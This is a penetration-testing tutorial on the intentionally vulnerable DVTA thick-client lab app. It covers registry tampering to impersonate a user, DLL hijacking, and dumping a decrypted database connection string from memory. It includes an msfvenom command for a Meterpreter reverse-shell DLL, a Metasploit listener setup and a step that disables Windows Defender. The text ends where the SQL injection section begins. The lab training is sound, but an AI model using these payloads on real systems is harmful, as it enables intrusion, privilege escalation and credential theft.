<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/penetration-testing/" rel="category tag">Penetration Testing</a></span>            </div>
            <h1 class="post-title entry-title">Thick Client Penetration Testing on DVTA</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/thick-client-penetration-testing-on-dvta/" rel="bookmark"><time class="entry-date published" datetime="2021-03-22T18:45:02+00:00">March 22, 2021</time><time class="updated" datetime="2025-05-30T16:07:15+00:00">May 30, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p class="ai-optimize-6 ai-optimize-introduction"><span style="color: #000000;">In the previous article, we have seen some methods to Analyze the Traffic of Thick Client Applications specifically in DVTA.</span></p>
<p class="ai-optimize-7"><span style="color: #000000;">You can take a look at that article by browsing this link: – <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.hackingarticles.in/thick-client-penetration-testing-traffic-analysis/">https://www.hackingarticles.in/thick-client-penetration-testing-traffic-analysis/</a></strong></span></span></p>
<p class="ai-optimize-8"><span style="color: #000000;">In this article, we will perform some attacks to pen-test the application.</span></p>
<h3 class="ai-optimize-9"><span style="color: #800000;">Table of Content</span></h3>
<ul>
<li class="ai-optimize-10"><span style="color: #000000;">Prerequisites</span></li>
<li class="ai-optimize-11"><span style="color: #000000;">Privilege Escalation</span></li>
<li class="ai-optimize-12"><span style="color: #000000;">DLL Hijacking</span></li>
<li class="ai-optimize-13"><span style="color: #000000;">Dumping connection string from memory</span></li>
<li class="ai-optimize-14"><span style="color: #000000;">SQL Injection</span></li>
<li class="ai-optimize-15"><span style="color: #000000;">Side Channel Data Leak</span></li>
<li class="ai-optimize-16"><span style="color: #000000;">Forensic Investigation: – Unreliable logs</span></li>
</ul>
<h3 class="ai-optimize-17"><span style="color: #800000;">Prerequisites</span></h3>
<ul>
<li class="ai-optimize-18"><span style="color: #000000;">Attacker machine: – Kali Linux</span></li>
<li class="ai-optimize-19"><span style="color: #000000;">Regshot: – For Privilege Escalation</span></li>
<li class="ai-optimize-20"><span style="color: #000000;">Process Hacker: – To dump the memory strings</span></li>
<li class="ai-optimize-21"><span style="color: #000000;">Procmon from Sysinternal suite</span></li>
</ul>
<h3 class="ai-optimize-22"><span style="color: #800000;">Privilege Escalation</span></h3>
<p class="ai-optimize-23"><span style="color: #000000;">Regshot is a great open-source registry compare utility that you can use to compare the number of registry entries or installing a new software product. So that you can easily take a snapshot of your registry and then compare it with a second. Let us see how we can use Regshot to figure out what modifications are done to the registry entries after running our application.</span></p>
<p class="ai-optimize-24"><span style="color: #000000;">First of all download the Regshot application go going to the official site or you can directly download it from here: – <a style="color: #000000;" href="https://sourceforge.net/projects/regshot/files/latest/download">https://sourceforge.net/projects/regshot/files/latest/download</a></span></p>
<p class="ai-optimize-25"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-0ST8w7KtU2E/YFi30_8f0dI/AAAAAAAAu2U/TNWRbAOCMk4SF1dOZYh1-p9X3-egKyWrwCLcBGAsYHQ/s16000/1.png"/></span></p>
<p class="ai-optimize-26"><span style="color: #000000;">Download and extract It into your system and open up 32 version of regshot</span></p>
<p class="ai-optimize-27"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-hm5uFQoU8nA/YFi34VOwxtI/AAAAAAAAu2Y/thZZhDeK5ocbuv9M4D3ITILQz34Nvr92ACLcBGAsYHQ/s16000/2.png"/></span></p>
<p class="ai-optimize-28"><span style="color: #000000;">After opening up the application choose the HTML document and take the 1<sup>st</sup> shot. So this should take a snapshot of all the registries entries.</span></p>
<p class="ai-optimize-29"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-HaY2B-TuMU0/YFi37xMzmkI/AAAAAAAAu2c/r9h-637WqfkImwm-uLahj7Ity-spowQQQCLcBGAsYHQ/s16000/3.png"/></span></p>
<p class="ai-optimize-30"><span style="color: #000000;">Once 1<sup>st</sup> shot is done open up the DVTA application and explores the application a bit by logging in to one of the user accounts and taking the profile information. After that we will take the second shot to observe the difference between the registry entries before running the application and registry entries after running the application.</span></p>
<h4 class="ai-optimize-196"><span style="color: #000000;">Detecting Registry Changes After Running DVTA</span></h4>
<p class="ai-optimize-31"><span style="color: #000000;">Let’s open up the DVTA application and log in as Vijay or another user that you have created.</span></p>
<p class="ai-optimize-32"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-xQ4lMsQmk5Q/YFi4AW54-nI/AAAAAAAAu2g/vvFlWEwIODkAGclajOvyp7fILGGLkYreQCLcBGAsYHQ/s16000/4.png"/></span></p>
<p class="ai-optimize-33"><span style="color: #000000;">And then explore the application such as by clicking on View Profile or by checking expenses.</span></p>
<p class="ai-optimize-34"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-SZ0mGuR-m1o/YFi4ELXdTMI/AAAAAAAAu2k/zbZwOq2ztyMUwmQVfYyhnuiHVM3JRgLWgCLcBGAsYHQ/s16000/5.png"/></span></p>
<p class="ai-optimize-35"><span style="color: #000000;">Now, let’s take a second shot to see what registries entries have been modified.</span></p>
<p class="ai-optimize-36"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Ltzwh1FI5S8/YFi4Ju5aSbI/AAAAAAAAu2o/sB6Hmb6Cz94RwuatdFQqDQDENjsoh0exgCLcBGAsYHQ/s16000/6.png"/></span></p>
<p class="ai-optimize-37"><span style="color: #000000;">Ok, great 2<sup>nd</sup> shot also has been taken, let’s compare both of the entries.</span></p>
<p class="ai-optimize-38"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-KN6ahrXv76s/YFi4ND9sFcI/AAAAAAAAu2w/qqXEcZmndOUqGHHiiVZrVQCzcUTwThgBACLcBGAsYHQ/s16000/7.png"/></span></p>
<p class="ai-optimize-39"><span style="color: #000000;">It will show you an HTML file with all the differences between the 1<sup>st</sup> shot and 2<sup>nd</sup> shot. It will show you lots of entries. To make it easier to search for DVTA. When you apply the find filter it will show you some DVTA related entries. If you notice these are the registries entries that are modified while the application was running probably when we have logged in to the application at that time the DVTA application might have saved these values. </span></p>
<p class="ai-optimize-39"><span style="color: #000000;">You can see that <strong><em>initially, the user name was “null” </em></strong>after running the application the value <strong><em>Vijay</em></strong> was added to this registry entry. Similarly, <strong><em>initially, the password was null, and “Vijay” was added after running the application</em></strong>. Basically, after logging in as Vijay the user name password was saved into the registry’s entries. Similarly, <strong><em>null has been replaced by “<a style="color: #000000;" href="mailto:vijay@test.com">vijay@test.com</a>” for the Email</em></strong> entries and <strong><em>is logged in made “True” from false</em></strong> as shown below.</span></p>
<p class="ai-optimize-40"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-DjrHagZ8k_M/YFi4QzTJxaI/AAAAAAAAu24/zENrpdqI7WsZGFn26AlmWWX5Hkkx2VA1ACLcBGAsYHQ/s16000/8.png"/></span></p>
<h4 class="ai-optimize-197"><span style="color: #000000;">Privilege Escalation by Modifying Registry Values</span></h4>
<p class="ai-optimize-41"><span style="color: #000000;">This brings us to perform an interesting attack. To do this open up this particular registry entry into the registry editor as shown below. As we can see there the value of IsLoggedIn is true. So we can make use of this feature to log in as somebody else by changing the user name to Paras or whatever you want.</span></p>
<p class="ai-optimize-42"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-FaanTUpzpqo/YFi4UozOMxI/AAAAAAAAu3A/9-H6eygZg6ocI34s0yt1_nA_gKav6aD6QCLcBGAsYHQ/s16000/9.png"/></span></p>
<p class="ai-optimize-43"><span style="color: #000000;">Let’s see you can login or not into the DVTA application by using these registries entries. If the password is also going to verify by the client application you won’t be able to log in as paras. But if there are no checks made by the application to verify the password of the currently logged-in user account.</span></p>
<p class="ai-optimize-44"><span style="color: #000000;">So, let’s quickly check that we’re able to log in as paras or not.</span></p>
<p class="ai-optimize-45"><span style="color: #000000;">As we can see we have successfully able to log in as paras just by tempering the registry entry. If you look at the view profile it is still showing Vijay’s Email ID because we didn’t modify that.</span></p>
<p class="ai-optimize-46"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-sDFM-ud7K5c/YFi4ZwXRRfI/AAAAAAAAu3E/SvL3qYv_tAoV6MGg8Z79hbFRObVcMOiUACLcBGAsYHQ/s16000/10.png"/></span></p>
<p class="ai-optimize-47"><span style="color: #000000;">Now we’re also able to communicate with the database by submitting expenses here. All you need to do is to go to Add Expanses then create an expense and save it as shown below. After saving it the data will be stored in the database.</span></p>
<p class="ai-optimize-48"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-zkUpi11wGvM/YFi4eN3gDGI/AAAAAAAAu3M/-L4hdqZav244n0BwGiYnAaT4PFs6BZvGwCLcBGAsYHQ/s16000/11.png"/></span></p>
<p class="ai-optimize-49"><span style="color: #000000;">You can also verify whether the data is successfully stored in the database or not. As you can see in the below image, we can retrieve data from the database successfully.</span></p>
<p class="ai-optimize-50"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Lweza9GXV4c/YFi4hB_XuWI/AAAAAAAAu3Q/kS2wbQIGg0gWy3YeehGHjliLy78BpdFqwCLcBGAsYHQ/s16000/12.png"/></span></p>
<p class="ai-optimize-51"><span style="color: #000000;">This is how applications can make use of registry entries to save sensitive data and if attackers can find them, they can use them for different types of attacks.</span></p>
<h3 class="ai-optimize-52"><span style="color: #800000;">DLL Hijacking</span></h3>
<p class="ai-optimize-53">DLL Hijacking is one of the commonly seen vulnerabilities. Now we have a question moving around is what is DLL. DLL stands for Dynamic Link Library.</p>
<p class="ai-optimize-53">DLL files usually hold executable code that can be stored in different files and are loaded into RAM or invoked when the related code is required. When an application executes and use this DLL file and if the accurate path is not provided the application has to search for this DLL. The Windows operating system sets the path for DLL using global environmental variables. If an attacker manages to replace this library or DLL with his own DLL that has the same name as the one the target application is looking for, it may load the attacker’s DLL instead of the library that the application is looking for, and it may execute the malicious code placed by the attacker in the DLL file, which is known as DLL Hijacking.</p>
<p class="ai-optimize-54"><span style="color: #000000;"><em>To better understand DLL Hijacking we must understand how windows application find their DLL files when the full path is not provided.</em></span></p>
<p class="ai-optimize-55"><span style="color: #000000;">Now the question is how do we find if an application is vulnerable to DLL Hijacking.</span></p>
<h4 class="ai-optimize-198"><span style="color: #000000;">Testing DVTA for DLL Hijacking with Procmon</span></h4>
<p class="ai-optimize-56"><span style="color: #000000;">Let’s test that with our DVTA application but before we proceed with that these are their assumptions. Let’s assume, we have an initial foothold on the target machine with low admin. So we can easily manage to gain a shell on a windows machine where DVTA is running. But the problem is we got the access of windows with low privileges and we don’t have admin access. But we have found an application DVTA running with admin privileges. Now If this application is vulnerable to DLL Hijacking and we can exploit it then there is the highest probability that we will elevate our privileges to an administrator. Let’s do this</span></p>
<p class="ai-optimize-57"><span style="color: #000000;">Firstly, open “<strong>Procmon</strong>” from the Sysinternal suite</span></p>
<p class="ai-optimize-58"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-msnEeAV6-8c/YFi4kyLQjSI/AAAAAAAAu3U/01r4bcf3myAFWqhx4aH_-BhjXrVX0k0DACLcBGAsYHQ/s16000/13.png"/></span></p>
<p class="ai-optimize-59"><span style="color: #000000;">By opening procmon, it loads entries associate with all the processes. To reduce all the processes so let’s quickly apply a filter so that we will only see the data that we are interested in. To apply the filter, navigate to filter and apply the filter as shown below</span></p>
<ul>
<li class="ai-optimize-60"><span style="color: #000000;">The process name is DVTA.exe</span></li>
<li class="ai-optimize-61"><span style="color: #000000;">The path ends with dll</span></li>
<li class="ai-optimize-62"><span style="color: #000000;">The result ends with NAME NOT FOUND</span></li>
</ul>
<p class="ai-optimize-63"><span style="color: #000000;">So that you are going to see only the process related to DVTA.exe</span></p>
<p class="ai-optimize-64"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-UAi7CcuEDLo/YFi4o8gzORI/AAAAAAAAu3Y/xLwF7QnKUG8WMxEfb22c_DKZR4KbtmS5QCLcBGAsYHQ/s16000/14.png"/></span></p>
<p class="ai-optimize-65"><span style="color: #000000;">After applying the filter, quickly open the DVTA.exe and login into the application</span></p>
<p class="ai-optimize-66"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-0zkPmYE92vk/YFi4shC-sbI/AAAAAAAAu3c/5vPpl_uVCt4yRDgHdcukPyHAqs7lUwLEACLcBGAsYHQ/s16000/15.png"/></span></p>
<p class="ai-optimize-67"><span style="color: #000000;">We are basically finding out it is vulnerable to DLL hijacking or not. After log in to the application you can see a couple of entries were created in the procmon related to DVTA.exe. As you can see there it loaded two dll one is DWrite.dll another is SECUR32.DLL so basically, there are two DLL that are potentially usable for this attack.</span></p>
<p class="ai-optimize-68"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-GcrdAROiz1M/YFi4x0dZD1I/AAAAAAAAu3k/7REZ9aYcEYYYgVhb_YE3aafzz-CPIRsNwCLcBGAsYHQ/s16000/16.png"/></span></p>
<h4 class="ai-optimize-199"><span style="color: #000000;">Exploiting DLL Hijacking with Meterpreter Reverse Shell</span></h4>
<p class="ai-optimize-69"><span style="color: #000000;">Now the question is to check these two DLL are useable for us or not. To do this let’s go ahead and create a malicious DLL that gives a reverse shell.</span></p>
<p class="ai-optimize-70"><span style="color: #000000;">To create malicious DLL open the Kali Linux and create a malicious DLL using msfvenom as shown below</span></p>
<p class="ai-optimize-71"><span style="color: #000000;">Msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=4444 -f dll &gt; DWrite.dll</span></p>
<p class="ai-optimize-72"><span style="color: #000000;">Then after moving this file to webroot so that we can download the DLL file In the victim machine by typing</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cp DWrite.dll /var/www/html</pre>
<p class="ai-optimize-73"><span style="color: #000000;">and then start the apache service by typing</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">service apache2 start</pre>
<p class="ai-optimize-74"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-rPHrLxhieww/YFi42ni1QNI/AAAAAAAAu3s/bRsyJXXaASMhis8aMNG3bb4dN2tx2A-UgCLcBGAsYHQ/s16000/17.png"/></span></p>
<p class="ai-optimize-75"><span style="color: #000000;">Let’s download these DLL files into the windows machine. However, there is a problem these files will be flagged as a virus, and windows defender will not allow you to download them. So we will have to disable windows defender for a while.</span></p>
<p class="ai-optimize-76"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-BFAd6L2rClY/YFi47MvcqtI/AAAAAAAAu3w/yTBsZvbZLkMH8K8aSHWRt6l4U3AkmygxACLcBGAsYHQ/s16000/18.png"/></span></p>
<p class="ai-optimize-77"><span style="color: #000000;">Now you good to download the DLL file by navigating to 192.168.0.108 in your browser</span></p>
<p class="ai-optimize-78"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-kV8jgxy2Vgs/YFi4_kqqMlI/AAAAAAAAu34/KLqMBNvTPcwL88AaAsXNzSsocQujg2DAQCLcBGAsYHQ/s16000/19.png"/></span></p>
<p class="ai-optimize-79"><span style="color: #000000;">Now navigate to the Downloads folder and copy the Dwrite.dll file</span></p>
<p class="ai-optimize-80"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-x8kkMpeivZc/YFi5DvKy9FI/AAAAAAAAu4A/q6-axhtGruYWGzJTjo2Y26rvaa_T4SbSwCLcBGAsYHQ/s16000/20.png"/></span></p>
<p class="ai-optimize-81"><span style="color: #000000;">And place it in the directory of the DVTA application</span></p>
<p class="ai-optimize-82"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-H021CpTCKbQ/YFi5HZByiBI/AAAAAAAAu4I/w9pH7_QrbyEkZP-Mvf8Dm2ZDoHaufGz1QCLcBGAsYHQ/s16000/21.png"/></span></p>
<h5 class="ai-optimize-200"><strong><span style="color: #000000;">Setting Up the Listener and Triggering the Attack</span></strong></h5>
<p class="ai-optimize-83"><span style="color: #000000;">Now come back to Kali Linux and setup Metasploit listener with the meterpreter payload. To do this type the following command</span></p>
<p class="ai-optimize-84"><span style="color: #000000;">msfconsole</span></p>
<p class="ai-optimize-85"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-GxcjY01EsQI/YFi5OfgexTI/AAAAAAAAu4M/C-jTrZs1UPgdLm09XesukzowrQjjtVYnQCLcBGAsYHQ/s16000/22.png"/></span></p>
<p class="ai-optimize-86"><span style="color: #000000;">After opening up the msfconsole run the following command</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.0.108
set LPORT 4444
exploit</pre>
<p class="ai-optimize-87"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-GwKuS1Dpt7Q/YFi5Tosc_dI/AAAAAAAAu4U/IbSMzGydGHsFqZ0GQ__f3JWcg3e659zRgCLcBGAsYHQ/s16000/23.png"/></span></p>
<p class="ai-optimize-88"><span style="color: #000000;">Now, it should give us a shell when the DLL file is executed by the DVTA application. To do this go back to the windows machine and assume as an attacker….that you have placed a malicious file in the directory of the DVTA application and you will have to wait for the administrator to restart the DVTA application from its directory.</span></p>
<p class="ai-optimize-89"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-XC3oD9UUtRk/YFi5X7Vp8tI/AAAAAAAAu4c/WRZNXivj0zMdX6EqqTyklD8pQZwOLRRlQCLcBGAsYHQ/s16000/24.png"/></span></p>
<p class="ai-optimize-90"><span style="color: #000000;">So, now in this case we have to assume that the administrator came in and he opened the DVTA application. <strong><em>Here must remember one thing when the administrator tries to run the application is not going to open just due to that wrong DLL file that terminates the execution of the DVTA application</em></strong><em>.</em> Now come back to the Kali Linux machine and where you can see we got a meterpreter shell</span></p>
<p class="ai-optimize-91"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-MsjQzwTwzzI/YFi5i7dlkkI/AAAAAAAAu4k/_lsZeVMOc0sf4k_eb_fb_XHN4rE932mIACLcBGAsYHQ/s16000/25.png"/></span></p>
<h5 class="ai-optimize-201"><strong><span style="color: #000000;">Gaining Access and Migrating the Session</span></strong></h5>
<p class="ai-optimize-92"><span style="color: #000000;">But when the administrator tries to run the application that application will not be loaded so, maybe he tries to kill the process. To prevent from losing the shell let’s just quickly migrate to the stable process by running the following command</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ps</pre>
<p class="ai-optimize-93"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ecZ_R0oSqLo/YFi5okdYI_I/AAAAAAAAu4w/TbLurdYot9oaXwQA0EWpirfmpt9_a9UzQCLcBGAsYHQ/s16000/26.png"/></span></p>
<p class="ai-optimize-94"><span style="color: #000000;">Now quickly find a stable process according to your environment here I’m migrating to the process of explorer.exe</span></p>
<p class="ai-optimize-95"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-uKpA58H9Mu4/YFi5vWFhwJI/AAAAAAAAu40/upBwsVwSJL4RDoRUIPIb1BmHPbcfMlf_gCLcBGAsYHQ/s16000/27.png"/></span></p>
<p class="ai-optimize-96"><span style="color: #000000;">You can see there each process have their process ID. To migrate another process like explorer.exe run the below command in my case I’m migrating to process ID 8036 explorer.exe</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">migrate 8036</pre>
<p class="ai-optimize-97"><span style="color: #000000;">After running this command migration will be completed successfully. Even the administrator goes to the task manager and kills the process of DVTA application just because the application was not loaded. Your session is not going to end, also you can verify it by running the following command</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">getuid</pre>
<p class="ai-optimize-98"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Ppf2fb2lagQ/YFi52AJK8iI/AAAAAAAAu48/vrJ1oAVhml8h4qmk9O9138_7VbYE08LFwCLcBGAsYHQ/s16000/28.png"/></span></p>
<p class="ai-optimize-99"><span style="color: #000000;">This is how we can exploit DLL hijacking vulnerability in Thick Client Applications.</span></p>
<h3 class="ai-optimize-100"><span style="color: #800000;">Dumping connection string from memory</span></h3>
<p class="ai-optimize-101"><span style="color: #000000;">As we have already seen two types of data storage issues in thick client applications one is storing sensitive data in registry entries and another one is hardcoded credentials. Now we are going to see another type of data storage issue that predominantly affects the 2-tier application that involves finding database connection strings in memory. There are two scenarios to find these database connection strings.</span></p>
<h5 class="ai-optimize-102"><strong><span style="color: #000000;">Scenario 1</span></strong></h5>
<ul>
<li class="ai-optimize-103"><span style="color: #000000;">A Clear text connection string may be hardcoded in the client application. So if you can somehow decompile the application or if you can find the strings in the application you may be able to identify this connection string.</span></li>
<li class="ai-optimize-104"><span style="color: #000000;">When the application makes a database connection that connection string has to be in memory so if you can dump the memory while the application is running it is highly likely that you will find the database connection string.</span></li>
</ul>
<h5 class="ai-optimize-105"><strong><span style="color: #000000;">Scenario 2</span></strong></h5>
<ul>
<li class="ai-optimize-106"><span style="color: #000000;">A lot of applications hardcode the database connection string however they encrypt it. So, an attacker who decompiles the application can find the hard-coded string but it is not useable to connect to the database.</span></li>
<li class="ai-optimize-107"><span style="color: #000000;">in this scenario when you run the application the application needs to decrypt the encrypted connection string and that decrypted connection string will be seen in memory.</span></li>
</ul>
<p class="ai-optimize-108"><span style="color: #000000;">In both cases, if we can dump the memory of the process, we should be able to find the clear text connection string in memory. When it comes to the DVTA application it comes under scenario 2. It contains a hard-coded connection string but the connection string is encrypted but when the application is being run it has to decrypt the encrypted connection string to be able to communicate with the database.</span></p>
<h4 class="ai-optimize-195"><span style="color: #000000;">Dumping Memory Using Process Hacker</span></h4>
<p class="ai-optimize-109"><span style="color: #000000;">Let’s see how we can dump the memory of a specific process. There are multiple ways are present to do this but we are going to use a tool called process hacker.</span></p>
<p class="ai-optimize-110"><span style="color: #000000;">You can download the process hacker tool by searching It on the web or you can download it directly from here.</span></p>
<h5 class="ai-optimize-111"><span style="color: #000000;">Process hacker: – <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://processhacker.sourceforge.io/downloads.php">https://processhacker.sourceforge.io/downloads.php</a></strong></span></span></h5>
<p class="ai-optimize-112"><span style="color: #000000;">We are going to download the portable binary here</span></p>
<p class="ai-optimize-113"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-eRWSp7cY5ao/YFi57dRgPcI/AAAAAAAAu5E/cC6Lv4vX_LYiIDb1-vr67tprW-B12E2cQCLcBGAsYHQ/s16000/29.png"/></span></p>
<p class="ai-optimize-114"><span style="color: #000000;">Download and extract it on your working directory. We are going to use a 64bit version of this tool which is x64 but before that open up the DVTA application and log in to the application.</span></p>
<p class="ai-optimize-115"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/--JmN2ZCRPMc/YFi5_YDcQxI/AAAAAAAAu5M/H93SIm0zvYE_GqnODJCuk-NDDxnaRVAxACLcBGAsYHQ/s16000/30.png"/></span></p>
<p class="ai-optimize-116"><span style="color: #000000;">Now, since we have connected to Vijay’s account this application has made some communication with the database so let’s run the Process hacker.</span></p>
<p class="ai-optimize-117"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-0RjTbWhARII/YFi6DPx5-nI/AAAAAAAAu5Q/hcaDPc4KxAwYvTb5WRhyO05AIg6q1tAAgCLcBGAsYHQ/s16000/31.png"/></span></p>
<p class="ai-optimize-118"><span style="color: #000000;">As we can see there are lots of processes. Let’s look for DVTA.exe because DVTA is running on another tab so we should be able to find it here as shown in the below image.</span></p>
<p class="ai-optimize-119"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-9ywKAKPiNJc/YFi6IENN8UI/AAAAAAAAu5Y/pZ5TIhKXYowQOjmysN0z5eU8kqB68EhuACLcBGAsYHQ/s16000/32.png"/></span></p>
<p class="ai-optimize-120"><span style="color: #000000;">Give a double click to the entry of DVTA.exe and then open its properties.</span></p>
<p class="ai-optimize-121"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-nS7MQ2s5HZM/YFi6Nsz3h_I/AAAAAAAAu5g/TLZqqy0OEEcjK5LM-h5pV2nmH34p2LTlQCLcBGAsYHQ/s16000/33.png"/></span></p>
<p class="ai-optimize-122"><span style="color: #000000;">After that go to the memory</span></p>
<p class="ai-optimize-123"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-fu56U30JqpQ/YFi6R-ctpjI/AAAAAAAAu5o/Wc_SErdQTHoRIkwoc3d3CrM2e-FE4gkCwCLcBGAsYHQ/s16000/34.png"/></span></p>
<p class="ai-optimize-124"><span style="color: #000000;">Click on the strings and then choose <strong><em>“image”</em></strong> and <strong><em>“mapped”.</em></strong></span></p>
<p class="ai-optimize-125"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-BBOzaK2SwBw/YFi6WIAct2I/AAAAAAAAu5s/1LrGb6JpaAQnv5KMNBnNd_iY-hCyVTXpwCLcBGAsYHQ/s16000/35.png"/></span></p>
<p class="ai-optimize-126"><span style="color: #000000;">Further, then it should find all the strings in the memory of this process. Now as you can see this is a very long list for us to search through. So, what we will do is quickly apply a filter with something very common in the database connection strings. So we will apply the filter with the keyword of <strong><em>“Data source” </em></strong>typically database connection strings contain this word data source.</span></p>
<p class="ai-optimize-127"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-pqaWvcVQTkQ/YFi6baXj9AI/AAAAAAAAu50/-k2EuNHAj9IZmCZEYHcWmVO_QuNhCdTMACLcBGAsYHQ/s16000/36.png"/></span></p>
<p class="ai-optimize-128"><span style="color: #000000;">After applying the filter, you can see a bunch of entries. As you can see there are multiple database connection strings with the decrypted password inside</span></p>
<p class="ai-optimize-129"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-NkgBb7jPvBI/YFi6fvBjkmI/AAAAAAAAu58/NtiE2YeufRweukr6NDaWuniLMVe38swcwCLcBGAsYHQ/s16000/37.png"/></span></p>
<p class="ai-optimize-130"><span style="color: #000000;">Now copy that entry and paste it on the notepad. As you can see this is the connection string that contains the <strong><em>“user Id”</em></strong> and the <strong><em>“decrypted password”.</em></strong></span></p>
<p class="ai-optimize-131"><span style="color: #000000;"><strong><em> <img decoding="async" src="https://1.bp.blogspot.com/-Ur7KLeGlP5k/YFi6mVcvpNI/AAAAAAAAu6E/-Jt9BhN-bBojRBQUb5YTwc1P5ZlQTHwBACLcBGAsYHQ/s16000/38.png"/></em></strong></span></p>
<h5 class="ai-optimize-202"><strong><span style="color: #000000;">Using Extracted Credentials to Access the Database</span></strong></h5>
<p class="ai-optimize-132"><span style="color: #000000;">Now let’s see how we can make use of this particular database connection string as an attacker to connect to the database. We are going to use <strong><em>“SQL Server Management Studio”.</em></strong> Assume that we are connecting as an attacker so we need to use SQL Server authentication and from the database connection string we found that server IP address which is <strong><em>“localhost\SQLEXPRESS”</em></strong> and <strong><em>“password is p@ssw0rd”.</em></strong></span></p>
<p class="ai-optimize-133"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-DgJRPdde_Pg/YFi62Psu1sI/AAAAAAAAu6U/ddyVanRg-csDpqPdqWbE4g39BPBYbE72ACLcBGAsYHQ/s16000/39.png"/></span></p>
<p class="ai-optimize-134"><span style="color: #000000;">As you can see we are connected to the Database. Now we can dump sensitive data from the database or we can explore the database like tables or we can do whatever we want as an attacker.</span></p>
<p class="ai-optimize-135"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-feCUIn1-5nc/YFi654MJNYI/AAAAAAAAu6Y/UWMa0Ibc6RI7Jj8zyRVJX9ckgrQaMD-4ACLcBGAsYHQ/s16000/40.png"/></span></p>
<h5 class="ai-optimize-136"><span style="color: #000000;"><strong><em>Conclusion: – </em></strong></span></h5>
<p class="ai-optimize-136"><span style="color: #000000;"><strong><em>This is how we’ve extracted the database connection string from the memory. As I have already mentioned DVTA application uses an encrypted hardcoded connection string.</em></strong></span></p>
<h3 class="ai-optimize-137"><span style="color: #800000;">Sql Injection</span></h3>
<p class="ai-optimize-138"><span style="color: #000000;">This is also one of the commonly seen vulnerabilities in the thick client application is SQL injection. Damn Vulnerable Thick Client application is also affected by SQL injection.</span></p>
